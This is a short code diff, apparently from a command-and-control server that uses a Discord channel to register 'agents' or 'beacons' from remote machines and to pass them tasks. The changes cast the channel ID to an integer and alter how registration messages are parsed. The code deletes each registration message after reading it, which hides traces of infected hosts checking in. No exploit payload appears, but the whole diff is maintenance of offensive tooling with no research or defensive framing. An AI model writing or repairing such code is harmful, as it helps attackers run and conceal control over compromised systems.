@@ -8,7 +8,7 @@ from discord_server import client
 # Global client object for Discord
 
 # Channel where tasks and responses are communicated
-COMMAND_CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID') # Replace with your command channel ID
+COMMAND_CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID')) # Replace with your command channel ID
 TASK_PREFIX = 'TaskForYou'
 RESP_PREFIX = 'RespForYou'
 
@@ -61,9 +61,9 @@ async def fetchNewBeacons():
     beacons = []
     channel = client.get_channel(COMMAND_CHANNEL_ID)
     if channel:
-        async for message in channel.history(limit=100):  # Adjust the limit based on need
-            if message.content.startswith("AGENT:"):
-                beaconId = message.content.split("AGENT:")[1]
+        async for message in channel.history(limit=2):  # Adjust the limit based on need
+            if message.content.startswith("[+] Registering new agent AGENT:"):
+                beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
                 print(f"[+] Discovered new Agent in channel: {beaconId}")
                 beacons.append(beaconId)
                 await message.delete()  # Delete the message after detecting the beacon
